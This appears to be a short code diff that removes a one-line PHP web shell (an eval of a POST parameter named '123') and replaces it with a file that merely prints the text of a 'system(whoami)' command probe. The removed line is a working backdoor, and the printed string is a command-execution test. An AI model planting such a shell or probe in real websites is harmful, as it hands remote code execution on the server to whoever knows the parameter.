@@ -1,1 +1,3 @@
-<?php @eval($_POST['123']);?> 
+<?php
+echo "<?php system(whoami);?>";
+?>
